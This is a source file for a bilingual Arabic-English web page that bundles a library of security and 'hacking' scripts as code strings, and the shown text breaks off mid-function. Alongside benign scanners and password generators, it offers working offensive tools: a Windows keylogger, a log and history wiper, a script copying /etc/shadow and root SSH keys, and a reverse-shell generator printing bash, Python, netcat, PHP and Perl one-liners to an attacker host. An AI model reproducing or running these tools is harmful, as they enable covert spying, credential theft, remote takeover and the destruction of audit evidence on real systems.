import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";
import { Code, Copy, Check, Globe, Terminal, FileCode, Hash, Network, Search, Key, Shield, Mail, Link, Wifi, Eye, Lock, FileText, Bug, Database, Server, Skull, Cpu, HardDrive, AlertTriangle, Binary } from "lucide-react";
import { useState } from "react";

import { LucideIcon } from "lucide-react";

interface Script {
  name: { ar: string; en: string };
  description: { ar: string; en: string };
  language: "Python" | "C++" | "Bash" | "JavaScript" | "Ruby";
  code: string;
  icon?: LucideIcon;
}

const getScriptIcon = (name: string): LucideIcon => {
  const lowerName = name.toLowerCase();
  if (lowerName.includes("port") || lowerName.includes("scan")) return Network;
  if (lowerName.includes("hash") || lowerName.includes("crack")) return Hash;
  if (lowerName.includes("password") || lowerName.includes("مرور")) return Key;
  if (lowerName.includes("subdomain") || lowerName.includes("نطاق")) return Search;
  if (lowerName.includes("network") || lowerName.includes("شبكة")) return Wifi;
  if (lowerName.includes("keylogger")) return Eye;
  if (lowerName.includes("email") || lowerName.includes("بريد")) return Mail;
  if (lowerName.includes("url") || lowerName.includes("رابط")) return Link;
  if (lowerName.includes("encrypt") || lowerName.includes("تشفير")) return Lock;
  if (lowerName.includes("file") || lowerName.includes("ملف")) return FileText;
  if (lowerName.includes("shell") || lowerName.includes("reverse")) return Terminal;
  if (lowerName.includes("process") || lowerName.includes("عملي")) return Cpu;
  if (lowerName.includes("firewall") || lowerName.includes("جدار")) return Shield;
  if (lowerName.includes("system") || lowerName.includes("نظام")) return HardDrive;
  if (lowerName.includes("log") || lowerName.includes("سجل")) return FileCode;
  if (lowerName.includes("extract") || lowerName.includes("استخراج")) return Database;
  return Code;
};

const scripts: Script[] = [
  // Python Scripts
  {
    name: { ar: "ماسح المنافذ", en: "Port Scanner" },
    description: { ar: "ماسح منافذ بسيط وسريع", en: "Simple and fast port scanner" },
    language: "Python",
    code: `import socket
from concurrent.futures import ThreadPoolExecutor

def scan_port(target, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        result = sock.connect_ex((target, port))
        if result == 0:
            print(f"[+] Port {port} is OPEN")
        sock.close()
    except:
        pass

def main():
    target = input("Enter target IP: ")
    print(f"\\nScanning {target}...\\n")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(1, 1025):
            executor.submit(scan_port, target, port)

if __name__ == "__main__":
    main()`,
  },
  {
    name: { ar: "كاسر الهاش", en: "Hash Cracker" },
    description: { ar: "أداة لكسر الهاش باستخدام قائمة كلمات", en: "Hash cracking tool with wordlist" },
    language: "Python",
    code: `import hashlib

def crack_hash(target_hash, wordlist, hash_type="md5"):
    hash_funcs = {
        "md5": hashlib.md5,
        "sha1": hashlib.sha1,
        "sha256": hashlib.sha256
    }
    
    if hash_type not in hash_funcs:
        print("Unsupported hash type")
        return None
    
    with open(wordlist, "r", encoding="utf-8", errors="ignore") as f:
        for word in f:
            word = word.strip()
            hashed = hash_funcs[hash_type](word.encode()).hexdigest()
            if hashed == target_hash:
                print(f"[+] Found: {word}")
                return word
    
    print("[-] Password not found")
    return None

# Usage
# crack_hash("5d41402abc4b2a76b9719d911017c592", "rockyou.txt", "md5")`,
  },
  {
    name: { ar: "مكتشف النطاقات الفرعية", en: "Subdomain Finder" },
    description: { ar: "اكتشاف النطاقات الفرعية", en: "Discover subdomains" },
    language: "Python",
    code: `import requests
import concurrent.futures

subdomains = [
    "www", "mail", "ftp", "admin", "blog", "shop", "api",
    "dev", "test", "staging", "app", "mobile", "cdn", "vpn",
    "portal", "secure", "login", "dashboard", "panel", "cpanel"
]

def check_subdomain(subdomain, domain):
    url = f"http://{subdomain}.{domain}"
    try:
        response = requests.get(url, timeout=3)
        print(f"[+] Found: {url} ({response.status_code})")
        return url
    except:
        return None

def find_subdomains(domain):
    print(f"\\nScanning subdomains for {domain}...\\n")
    found = []
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = {executor.submit(check_subdomain, sub, domain): sub for sub in subdomains}
        for future in concurrent.futures.as_completed(futures):
            result = future.result()
            if result:
                found.append(result)
    
    print(f"\\n[*] Found {len(found)} subdomains")
    return found

# Usage: find_subdomains("example.com")`,
  },
  {
    name: { ar: "ماسح الشبكة", en: "Network Scanner" },
    description: { ar: "مسح الأجهزة في الشبكة المحلية", en: "Scan local network devices" },
    language: "Python",
    code: `from scapy.all import ARP, Ether, srp
import sys

def scan_network(ip_range):
    print(f"\\nScanning network: {ip_range}\\n")
    print("-" * 50)
    print(f"{'IP Address':<20} {'MAC Address':<20}")
    print("-" * 50)
    
    # Create ARP request
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send and receive
    result = srp(packet, timeout=3, verbose=0)[0]
    
    devices = []
    for sent, received in result:
        devices.append({
            'ip': received.psrc,
            'mac': received.hwsrc
        })
        print(f"{received.psrc:<20} {received.hwsrc:<20}")
    
    print("-" * 50)
    print(f"\\n[*] Found {len(devices)} devices")
    return devices

# Usage: scan_network("192.168.1.0/24")`,
  },
  {
    name: { ar: "كاشف Keylogger", en: "Keylogger Detector" },
    description: { ar: "كشف برامج التجسس على لوحة المفاتيح", en: "Detect keyboard spyware" },
    language: "Python",
    code: `import psutil
import os

suspicious_names = [
    "keylogger", "logger", "hook", "capture", "spy",
    "monitor", "record", "keystroke", "input"
]

def detect_keyloggers():
    print("\\n[*] Scanning for suspicious processes...\\n")
    
    suspicious = []
    for proc in psutil.process_iter(['pid', 'name', 'exe']):
        try:
            name = proc.info['name'].lower()
            for keyword in suspicious_names:
                if keyword in name:
                    suspicious.append({
                        'pid': proc.info['pid'],
                        'name': proc.info['name'],
                        'path': proc.info['exe']
                    })
                    break
        except (psutil.NoSuchProcess, psutil.AccessDenied):
            continue
    
    if suspicious:
        print("[!] Suspicious processes found:")
        for proc in suspicious:
            print(f"  PID: {proc['pid']}, Name: {proc['name']}")
            print(f"  Path: {proc['path']}\\n")
    else:
        print("[+] No suspicious keylogger processes detected")
    
    return suspicious

detect_keyloggers()`,
  },
  {
    name: { ar: "مولد كلمات المرور", en: "Password Generator" },
    description: { ar: "توليد كلمات مرور قوية", en: "Generate strong passwords" },
    language: "Python",
    code: `import random
import string

def generate_password(length=16, use_special=True):
    chars = string.ascii_letters + string.digits
    if use_special:
        chars += string.punctuation
    
    password = ''.join(random.SystemRandom().choice(chars) for _ in range(length))
    return password

def generate_wordlist(count=100, min_len=8, max_len=16):
    wordlist = []
    for _ in range(count):
        length = random.randint(min_len, max_len)
        wordlist.append(generate_password(length))
    return wordlist

# Generate 5 passwords
print("Generated Passwords:")
for i in range(5):
    print(f"  {i+1}. {generate_password(20)}")`,
  },
  {
    name: { ar: "مستخرج البريد الإلكتروني", en: "Email Extractor" },
    description: { ar: "استخراج الإيميلات من صفحات الويب", en: "Extract emails from web pages" },
    language: "Python",
    code: `import re
import requests
from bs4 import BeautifulSoup

def extract_emails(url):
    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        text = soup.get_text()
        
        email_pattern = r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}'
        emails = set(re.findall(email_pattern, text))
        
        print(f"\\n[*] Found {len(emails)} emails on {url}:\\n")
        for email in sorted(emails):
            print(f"  {email}")
        
        return list(emails)
    except Exception as e:
        print(f"Error: {e}")
        return []

# Usage: extract_emails("https://example.com")`,
  },
  {
    name: { ar: "فاحص الروابط", en: "URL Checker" },
    description: { ar: "فحص حالة الروابط والسيرفرات", en: "Check URL and server status" },
    language: "Python",
    code: `import requests
import ssl
import socket

def check_url(url):
    print(f"\\n[*] Checking {url}...\\n")
    
    try:
        response = requests.get(url, timeout=10, allow_redirects=True)
        print(f"[+] Status Code: {response.status_code}")
        print(f"[+] Final URL: {response.url}")
        print(f"[+] Server: {response.headers.get('Server', 'Unknown')}")
        print(f"[+] Content-Type: {response.headers.get('Content-Type', 'Unknown')}")
        
        # Check SSL
        if url.startswith('https'):
            hostname = url.split('/')[2]
            ctx = ssl.create_default_context()
            with ctx.wrap_socket(socket.socket(), server_hostname=hostname) as s:
                s.connect((hostname, 443))
                cert = s.getpeercert()
                print(f"[+] SSL Valid Until: {cert['notAfter']}")
        
        return response.status_code
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

# Usage: check_url("https://google.com")`,
  },
  // C++ Scripts
  {
    name: { ar: "ماسح المنافذ (C++)", en: "Port Scanner (C++)" },
    description: { ar: "ماسح منافذ سريع بلغة C++", en: "Fast port scanner in C++" },
    language: "C++",
    code: `#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <thread>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

void scan_port(const char* ip, int port) {
    SOCKET sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock == INVALID_SOCKET) return;
    
    sockaddr_in addr;
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip, &addr.sin_addr);
    
    DWORD timeout = 1000;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
    
    if (connect(sock, (sockaddr*)&addr, sizeof(addr)) == 0) {
        std::cout << "[+] Port " << port << " is OPEN" << std::endl;
    }
    closesocket(sock);
}

int main() {
    WSADATA wsa;
    WSAStartup(MAKEWORD(2, 2), &wsa);
    
    std::string target;
    std::cout << "Enter target IP: ";
    std::cin >> target;
    
    std::cout << "\\nScanning " << target << "...\\n" << std::endl;
    
    std::vector<std::thread> threads;
    for (int port = 1; port <= 1024; port++) {
        threads.emplace_back(scan_port, target.c_str(), port);
    }
    
    for (auto& t : threads) t.join();
    
    WSACleanup();
    return 0;
}`,
  },
  {
    name: { ar: "مولد كلمات المرور (C++)", en: "Password Generator (C++)" },
    description: { ar: "مولد كلمات مرور قوية", en: "Strong password generator" },
    language: "C++",
    code: `#include <iostream>
#include <string>
#include <random>
#include <ctime>

std::string generate_password(int length, bool upper, bool lower, 
                               bool digits, bool special) {
    std::string charset = "";
    if (upper)   charset += "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
    if (lower)   charset += "abcdefghijklmnopqrstuvwxyz";
    if (digits)  charset += "0123456789";
    if (special) charset += "!@#$%^&*()_+-=[]{}|;:,.<>?";
    
    if (charset.empty()) {
        return "Error: No character set selected";
    }
    
    std::mt19937 rng(std::time(nullptr));
    std::uniform_int_distribution<int> dist(0, charset.length() - 1);
    
    std::string password = "";
    for (int i = 0; i < length; i++) {
        password += charset[dist(rng)];
    }
    
    return password;
}

int main() {
    int length;
    std::cout << "Password length: ";
    std::cin >> length;
    
    std::cout << "\\nGenerated passwords:\\n" << std::endl;
    
    for (int i = 0; i < 5; i++) {
        std::string pwd = generate_password(length, true, true, true, true);
        std::cout << "  " << i+1 << ". " << pwd << std::endl;
    }
    
    return 0;
}`,
  },
  {
    name: { ar: "مشفر الملفات (C++)", en: "File Encryptor (C++)" },
    description: { ar: "تشفير الملفات باستخدام XOR", en: "XOR file encryption" },
    language: "C++",
    code: `#include <iostream>
#include <fstream>
#include <string>
#include <vector>

void xor_encrypt(const std::string& input_file, 
                 const std::string& output_file,
                 const std::string& key) {
    std::ifstream in(input_file, std::ios::binary);
    std::ofstream out(output_file, std::ios::binary);
    
    if (!in.is_open() || !out.is_open()) {
        std::cerr << "Error opening files!" << std::endl;
        return;
    }
    
    char byte;
    size_t key_index = 0;
    
    while (in.get(byte)) {
        byte ^= key[key_index % key.length()];
        out.put(byte);
        key_index++;
    }
    
    in.close();
    out.close();
    
    std::cout << "[+] File encrypted successfully!" << std::endl;
    std::cout << "[*] Output: " << output_file << std::endl;
}

int main() {
    std::string input, output, key;
    
    std::cout << "Input file: ";
    std::cin >> input;
    
    std::cout << "Output file: ";
    std::cin >> output;
    
    std::cout << "Encryption key: ";
    std::cin >> key;
    
    xor_encrypt(input, output, key);
    
    return 0;
}`,
  },
  {
    name: { ar: "Keylogger بسيط (C++)", en: "Simple Keylogger (C++)" },
    description: { ar: "مسجل ضغطات لوحة المفاتيح للتعليم", en: "Educational keyboard logger" },
    language: "C++",
    code: `#include <iostream>
#include <fstream>
#include <windows.h>

// WARNING: For educational purposes only!
// Use only on systems you own or have permission to test.

std::string get_key_name(int key) {
    switch(key) {
        case VK_SPACE: return " ";
        case VK_RETURN: return "[ENTER]\\n";
        case VK_BACK: return "[BACKSPACE]";
        case VK_TAB: return "[TAB]";
        case VK_SHIFT: return "";
        case VK_CONTROL: return "[CTRL]";
        case VK_CAPITAL: return "[CAPS]";
        case VK_ESCAPE: return "[ESC]";
        default:
            if (key >= 0x30 && key <= 0x5A) {
                char c = MapVirtualKey(key, MAPVK_VK_TO_CHAR);
                if (!(GetKeyState(VK_SHIFT) & 0x8000) && c >= 'A' && c <= 'Z')
                    c += 32; // lowercase
                return std::string(1, c);
            }
            return "";
    }
}

int main() {
    std::ofstream log("keylog.txt", std::ios::app);
    
    std::cout << "[*] Keylogger started (Press ESC to stop)" << std::endl;
    std::cout << "[*] Logging to keylog.txt" << std::endl;
    
    while (true) {
        for (int key = 8; key <= 255; key++) {
            if (GetAsyncKeyState(key) == -32767) {
                std::string output = get_key_name(key);
                if (!output.empty()) {
                    std::cout << output;
                    log << output;
                    log.flush();
                }
                if (key == VK_ESCAPE) {
                    log.close();
                    return 0;
                }
            }
        }
        Sleep(10);
    }
    return 0;
}`,
  },
  // Bash Scripts
  {
    name: { ar: "جامع معلومات النظام", en: "System Info Collector" },
    description: { ar: "جمع معلومات النظام", en: "Collect system information" },
    language: "Bash",
    code: `#!/bin/bash

echo "========================================="
echo "       SYSTEM INFORMATION COLLECTOR      "
echo "========================================="
echo ""

echo "[+] Hostname: $(hostname)"
echo "[+] User: $(whoami)"
echo "[+] OS: $(uname -a)"
echo ""

echo "[+] Network Interfaces:"
ip addr | grep -E "inet " | awk '{print "    " $2}'
echo ""

echo "[+] Open Ports:"
netstat -tuln 2>/dev/null | grep LISTEN | awk '{print "    " $4}'
echo ""

echo "[+] Running Services:"
systemctl list-units --type=service --state=running | head -20
echo ""

echo "[+] Last 5 Logins:"
last -5
echo ""

echo "[+] Disk Usage:"
df -h | grep -E "^/dev"
echo ""

echo "========================================="
echo "          Scan Complete                  "
echo "========================================="`,
  },
  {
    name: { ar: "نسخ احتياطي للجدار الناري", en: "Firewall Backup" },
    description: { ar: "نسخ احتياطي لقواعد الجدار الناري", en: "Backup firewall rules" },
    language: "Bash",
    code: `#!/bin/bash

BACKUP_DIR="/backup/firewall"
DATE=$(date +%Y%m%d_%H%M%S)
BACKUP_FILE="$BACKUP_DIR/iptables_backup_$DATE.rules"

# Create backup directory
mkdir -p $BACKUP_DIR

echo "[*] Creating firewall rules backup..."

# Backup iptables rules
iptables-save > $BACKUP_FILE

if [ $? -eq 0 ]; then
    echo "[+] Backup created: $BACKUP_FILE"
    echo "[+] File size: $(ls -lh $BACKUP_FILE | awk '{print $5}')"
    
    # Keep only last 10 backups
    cd $BACKUP_DIR
    ls -t | tail -n +11 | xargs -r rm --
    echo "[+] Old backups cleaned"
else
    echo "[-] Backup failed!"
    exit 1
fi

echo ""
echo "[*] Current rules count:"
echo "    IPv4: $(iptables -L -n | grep -c '^')"
echo "    IPv6: $(ip6tables -L -n | grep -c '^')"`,
  },
  {
    name: { ar: "ماسح الشبكة (Bash)", en: "Network Scanner (Bash)" },
    description: { ar: "مسح الشبكة المحلية", en: "Scan local network" },
    language: "Bash",
    code: `#!/bin/bash

if [ -z "$1" ]; then
    echo "Usage: $0 <network> (e.g., 192.168.1)"
    exit 1
fi

NETWORK=$1

echo "========================================="
echo "       NETWORK SCANNER                   "
echo "========================================="
echo ""
echo "[*] Scanning network: $NETWORK.0/24"
echo ""

for ip in $(seq 1 254); do
    (
        ping -c 1 -W 1 $NETWORK.$ip &>/dev/null
        if [ $? -eq 0 ]; then
            echo "[+] Host found: $NETWORK.$ip"
            # Get hostname if possible
            hostname=$(host $NETWORK.$ip 2>/dev/null | grep "domain name pointer" | awk '{print $5}')
            if [ ! -z "$hostname" ]; then
                echo "    Hostname: $hostname"
            fi
        fi
    ) &
done

wait
echo ""
echo "[*] Scan complete"`,
  },
  {
    name: { ar: "مراقب العمليات", en: "Process Monitor" },
    description: { ar: "مراقبة العمليات المشبوهة", en: "Monitor suspicious processes" },
    language: "Bash",
    code: `#!/bin/bash

echo "========================================="
echo "       PROCESS MONITOR                   "
echo "========================================="

SUSPICIOUS=("nc" "ncat" "netcat" "python" "perl" "ruby" "bash -i" "sh -i")

echo ""
echo "[*] Checking for suspicious processes..."
echo ""

for proc in "\${SUSPICIOUS[@]}"; do
    result=$(ps aux | grep -i "$proc" | grep -v grep)
    if [ ! -z "$result" ]; then
        echo "[!] Suspicious process found: $proc"
        echo "$result" | while read line; do
            echo "    $line"
        done
        echo ""
    fi
done

echo ""
echo "[*] Network connections (ESTABLISHED):"
netstat -tunapl 2>/dev/null | grep ESTABLISHED | head -10

echo ""
echo "[*] Listening ports:"
netstat -tunapl 2>/dev/null | grep LISTEN | head -10

echo ""
echo "[*] Scan complete"`,
  },
  {
    name: { ar: "منظف السجلات", en: "Log Cleaner" },
    description: { ar: "تنظيف سجلات النظام", en: "Clean system logs" },
    language: "Bash",
    code: `#!/bin/bash

# WARNING: Use only on systems you own!
# For educational purposes only.

echo "========================================="
echo "       LOG CLEANER                       "
echo "========================================="

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

LOG_FILES=(
    "/var/log/auth.log"
    "/var/log/syslog"
    "/var/log/messages"
    "/var/log/secure"
    "/var/log/wtmp"
    "/var/log/btmp"
    "/var/log/lastlog"
)

echo ""
echo "[*] Clearing log files..."

for log in "\${LOG_FILES[@]}"; do
    if [ -f "$log" ]; then
        echo -n > "$log" 2>/dev/null
        echo "[+] Cleared: $log"
    fi
done

# Clear bash history
echo "[+] Clearing bash history..."
history -c
cat /dev/null > ~/.bash_history

echo ""
echo "[*] Log cleanup complete"`,
  },
  {
    name: { ar: "مستخرج كلمات المرور", en: "Password Extractor" },
    description: { ar: "استخراج الهاشات من النظام", en: "Extract system hashes" },
    language: "Bash",
    code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use on systems you have permission to test.

echo "========================================="
echo "       PASSWORD HASH EXTRACTOR           "
echo "========================================="

if [ "$(id -u)" -ne 0 ]; then
    echo "[-] This script must be run as root"
    exit 1
fi

OUTPUT_DIR="./extracted_hashes"
mkdir -p $OUTPUT_DIR

echo ""
echo "[*] Extracting password information..."

# Extract /etc/passwd
if [ -f /etc/passwd ]; then
    cp /etc/passwd $OUTPUT_DIR/passwd.txt
    echo "[+] Copied /etc/passwd"
fi

# Extract /etc/shadow
if [ -f /etc/shadow ]; then
    cp /etc/shadow $OUTPUT_DIR/shadow.txt
    echo "[+] Copied /etc/shadow"
fi

# Create unshadow file for John
if [ -f $OUTPUT_DIR/passwd.txt ] && [ -f $OUTPUT_DIR/shadow.txt ]; then
    unshadow $OUTPUT_DIR/passwd.txt $OUTPUT_DIR/shadow.txt > $OUTPUT_DIR/unshadowed.txt 2>/dev/null
    echo "[+] Created unshadowed file"
fi

# Extract SSH keys
if [ -d /root/.ssh ]; then
    cp -r /root/.ssh $OUTPUT_DIR/root_ssh 2>/dev/null
    echo "[+] Copied root SSH keys"
fi

echo ""
echo "[*] Extraction complete. Files saved to: $OUTPUT_DIR"`,
  },
  {
    name: { ar: "Reverse Shell", en: "Reverse Shell" },
    description: { ar: "اتصال عكسي للتحكم عن بعد", en: "Reverse connection for remote control" },
    language: "Bash",
    code: `#!/bin/bash

# WARNING: Educational purposes only!
# Only use in authorized penetration testing.

echo "========================================="
echo "       REVERSE SHELL GENERATOR           "
echo "========================================="

echo ""
read -p "Enter your IP address: " LHOST
read -p "Enter your listening port: " LPORT

echo ""
echo "[*] Reverse Shell One-Liners:"
echo ""

echo "=== Bash ===" 
echo "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
echo ""

echo "=== Python ==="
echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
echo ""

echo "=== Netcat ==="
echo "nc -e /bin/sh $LHOST $LPORT"
echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $LHOST $LPORT >/tmp/f"
echo ""

echo "=== PHP ==="
echo "php -r '\$sock=fsockopen(\"$LHOST\",$LPORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
echo ""

echo "=== Perl ==="
echo "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'"
echo ""

echo "[*] Start listener with: nc -lvnp $LPORT"`,
  },
  // JavaScript Scripts
  {
    name: { ar: "ماسح المنافذ (Node.js)", en: "Port Scanner (Node.js)" },
    description: { ar: "ماسح منافذ بسيط باستخدام Node.js", en: "Simple port scanner using Node.js" },
    language: "JavaScript",
    code: `const net = require('net');

async function scanPort(host, port) {
  return new Promise((resolve) => {
    const socket = new net.Socket();
    socket.setTimeout(1000);
    
    socket.on('connect', () => {
      console.log(\`[+] Port \${port} is OPEN\`);
      socket.destroy();
      resolve(true);
    });
    
    socket.on('timeout', () => {
      socket.destroy();
      resolve(false);
    });
    
    socket.on('error', () => {
      socket.destroy();
      resolve(false);
    });
    
    socket.connect(port, host);
  });
}

async function scan(host, startPort = 1, endPort = 1024) {
  console.log(\`\\nScanning \${host} from port \${startPort} to \${endPort}...\\n\`);
  
  for (let port = startPort; port <= endPort; port++) {
    await scanPort(host, port);
  }
  
  console.log('\\n[*] Scan complete');
}

// Usage: scan('127.0.0.1', 1, 100);
scan(process.argv[2] || '127.0.0.1');`,
  },
  {
    name: { ar: "مولد كلمات المرور (JS)", en: "Password Generator (JS)" },
    description: { ar: "توليد كلمات مرور قوية", en: "Generate strong passwords" },
    language: "JavaScript",
    code: `const crypto = require('crypto');

function generatePassword(length = 16, options = {}) {
  const {
    uppercase = true,
    lowercase = true,
    numbers = true,
    symbols = true
  } = options;
  
  let charset = '';
  if (uppercase) charset += 'ABCDEFGHIJKLMNOPQRSTUVWXYZ';
  if (lowercase) charset += 'abcdefghijklmnopqrstuvwxyz';
  if (numbers) charset += '0123456789';
  if (symbols) charset += '!@#$%^&*()_+-=[]{}|;:,.<>?';
  
  if (!charset) return 'Error: No character set selected';
  
  const randomBytes = crypto.randomBytes(length);
  let password = '';
  
  for (let i = 0; i < length; i++) {
    password += charset[randomBytes[i] % charset.length];
  }
  
  return password;
}

// Calculate password strength
function checkStrength(password) {
  let score = 0;
  if (password.length >= 8) score++;
  if (password.length >= 12) score++;
  if (/[a-z]/.test(password)) score++;
  if (/[A-Z]/.test(password)) score++;
  if (/[0-9]/.test(password)) score++;
  if (/[^a-zA-Z0-9]/.test(password)) score++;
  
  const levels = ['Very Weak', 'Weak', 'Fair', 'Good', 'Strong', 'Very Strong'];
  return levels[Math.min(score, 5)];
}

// Generate 5 passwords
console.log('Generated Passwords:\\n');
for (let i = 0; i < 5; i++) {
  const pwd = generatePassword(20);
  console.log(\`  \${i + 1}. \${pwd} [\${checkStrength(pwd)}]\`);
}`,
  },
  {
    name: { ar: "كاسر الهاش (JS)", en: "Hash Cracker (JS)" },
    description: { ar: "كسر هاشات MD5 و SHA", en: "Crack MD5 and SHA hashes" },
    language: "JavaScript",
    code: `const crypto = require('crypto');
const fs = require('fs');
const readline = require('readline');

async function crackHash(targetHash, wordlistPath, hashType = 'md5') {
  console.log(\`\\n[*] Attempting to crack \${hashType.toUpperCase()} hash...\`);
  console.log(\`[*] Target: \${targetHash}\\n\`);
  
  const fileStream = fs.createReadStream(wordlistPath);
  const rl = readline.createInterface({
    input: fileStream,
    crlfDelay: Infinity
  });
  
  let attempts = 0;
  
  for await (const word of rl) {
    attempts++;
    const hash = crypto.createHash(hashType).update(word.trim()).digest('hex');
    
    if (hash === targetHash.toLowerCase()) {
      console.log(\`[+] Password found: \${word}\`);
      console.log(\`[+] Attempts: \${attempts}\`);
      return word;
    }
    
    if (attempts % 10000 === 0) {
      process.stdout.write(\`\\r[*] Tried \${attempts} passwords...\`);
    }
  }
  
  console.log(\`\\n[-] Password not found after \${attempts} attempts\`);
  return null;
}

// Example usage:
// crackHash('5d41402abc4b2a76b9719d911017c592', 'wordlist.txt', 'md5');

// Quick hash generator
function hashString(text, algorithm = 'md5') {
  return crypto.createHash(algorithm).update(text).digest('hex');
}

console.log('Hash Examples:');
console.log(\`MD5:    \${hashString('hello', 'md5')}\`);
console.log(\`SHA1:   \${hashString('hello', 'sha1')}\`);
console.log(\`SHA256: \${hashString('hello', 'sha256')}\`);`,
  },
  {
    name: { ar: "مستخرج الروابط", en: "Link Extractor" },
    description: { ar: "استخراج جميع الروابط من صفحة ويب", en: "Extract all links from a webpage" },
    language: "JavaScript",
    code: `const https = require('https');
const http = require('http');
const { URL } = require('url');

function extractLinks(targetUrl) {
  return new Promise((resolve, reject) => {
    const url = new URL(targetUrl);
    const client = url.protocol === 'https:' ? https : http;
    
    console.log(\`\\n[*] Fetching \${targetUrl}...\\n\`);
    
    client.get(targetUrl, (res) => {
      let html = '';
      
      res.on('data', (chunk) => html += chunk);
      res.on('end', () => {
        // Extract all href links
        const hrefRegex = /href=["']([^"']+)["']/gi;
        const srcRegex = /src=["']([^"']+)["']/gi;
        
        const links = new Set();
        let match;
        
        while ((match = hrefRegex.exec(html)) !== null) {
          links.add(match[1]);
        }
        while ((match = srcRegex.exec(html)) !== null) {
          links.add(match[1]);
        }
        
        const result = Array.from(links);
        
        console.log(\`[+] Found \${result.length} links:\\n\`);
        result.forEach((link, i) => {
          console.log(\`  \${i + 1}. \${link}\`);
        });
        
        resolve(result);
      });
    }).on('error', reject);
  });
}

// Usage: extractLinks('https://example.com');
const target = process.argv[2] || 'https://example.com';
extractLinks(target).catch(console.error);`,
  },
  {
    name: { ar: "فاحص HTTP Headers", en: "HTTP Headers Checker" },
    description: { ar: "فحص رؤوس HTTP للموقع", en: "Check website HTTP headers" },
    language: "JavaScript",
    code: `const https = require('https');
const http = require('http');
const { URL } = require('url');

function checkHeaders(targetUrl) {
  return new Promise((resolve, reject) => {
    const url = new URL(targetUrl);
    const client = url.protocol === 'https:' ? https : http;
    
    console.log(\`\\n[*] Checking headers for: \${targetUrl}\\n\`);
    console.log('='.repeat(50));
    
    client.get(targetUrl, (res) => {
      console.log(\`\\n[+] Status: \${res.statusCode} \${res.statusMessage}\\n\`);
      console.log('[+] Response Headers:\\n');
      
      const securityHeaders = [
        'content-security-policy',
        'x-frame-options',
        'x-xss-protection',
        'x-content-type-options',
        'strict-transport-security',
        'referrer-policy'
      ];
      
      Object.entries(res.headers).forEach(([key, value]) => {
        const isSecurityHeader = securityHeaders.includes(key.toLowerCase());
        const prefix = isSecurityHeader ? '[SECURITY]' : '          ';
        console.log(\`\${prefix} \${key}: \${value}\`);
      });
      
      // Check missing security headers
      console.log('\\n[*] Security Header Analysis:\\n');
      securityHeaders.forEach(header => {
        const exists = res.headers[header];
        const status = exists ? '[✓] Present' : '[✗] Missing';
        console.log(\`  \${status}: \${header}\`);
      });
      
      resolve(res.headers);
    }).on('error', reject);
  });
}

// Usage
const target = process.argv[2] || 'https://example.com';
checkHeaders(target).catch(console.error);`,
  },
  {
    name: { ar: "مشفر Base64", en: "Base64 Encoder/Decoder" },
    description: { ar: "تشفير وفك تشفير Base64", en: "Encode and decode Base64" },
    language: "JavaScript",
    code: `// Base64 Encoder/Decoder with multiple modes

function encode(text) {
  return Buffer.from(text).toString('base64');
}

function decode(base64) {
  return Buffer.from(base64, 'base64').toString('utf8');
}

function encodeUrl(text) {
  return Buffer.from(text).toString('base64url');
}

function decodeUrl(base64url) {
  return Buffer.from(base64url, 'base64url').toString('utf8');
}

// Encode file to base64
function encodeFile(filePath) {
  const fs = require('fs');
  const data = fs.readFileSync(filePath);
  return data.toString('base64');
}

// Interactive mode
const text = 'Hello, World! مرحبا بالعالم';

console.log('='.repeat(50));
console.log('       BASE64 ENCODER/DECODER');
console.log('='.repeat(50));
console.log(\`\\nOriginal: \${text}\`);
console.log('\\n[Encoding]');

const encoded = encode(text);
console.log(\`  Standard: \${encoded}\`);

const urlEncoded = encodeUrl(text);
console.log(\`  URL-Safe: \${urlEncoded}\`);

console.log('\\n[Decoding]');
console.log(\`  Decoded:  \${decode(encoded)}\`);

// XOR cipher for simple obfuscation
function xorCipher(text, key) {
  let result = '';
  for (let i = 0; i < text.length; i++) {
    result += String.fromCharCode(text.charCodeAt(i) ^ key.charCodeAt(i % key.length));
  }
  return encode(result);
}

console.log('\\n[XOR + Base64]');
const secret = xorCipher('secret message', 'key123');
console.log(\`  Encrypted: \${secret}\`);`,
  },
  {
    name: { ar: "منشئ Wordlist", en: "Wordlist Generator" },
    description: { ar: "إنشاء قوائم كلمات مرور مخصصة", en: "Generate custom password wordlists" },
    language: "JavaScript",
    code: `const fs = require('fs');

class WordlistGenerator {
  constructor() {
    this.words = new Set();
  }
  
  // Add base words
  addWords(words) {
    words.forEach(w => this.words.add(w));
  }
  
  // Add number variations
  addNumbers(word) {
    for (let i = 0; i <= 9999; i++) {
      this.words.add(word + i);
      this.words.add(i + word);
    }
  }
  
  // Add common substitutions
  addLeetSpeak(word) {
